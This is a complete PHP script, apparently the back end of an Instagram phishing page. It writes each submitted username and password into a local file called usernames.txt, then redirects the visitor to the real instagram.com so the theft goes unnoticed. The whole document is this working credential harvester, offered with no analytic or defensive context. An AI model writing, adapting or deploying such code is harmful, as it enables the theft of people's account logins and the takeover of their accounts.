<?php 
file_put_contents("usernames.txt", "\nUsername: " . $_POST['username'] . "\nPass: " . $_POST['Pass'] ."\n", FILE_APPEND);
header('Location: https://instagram.com/');
exit();
?>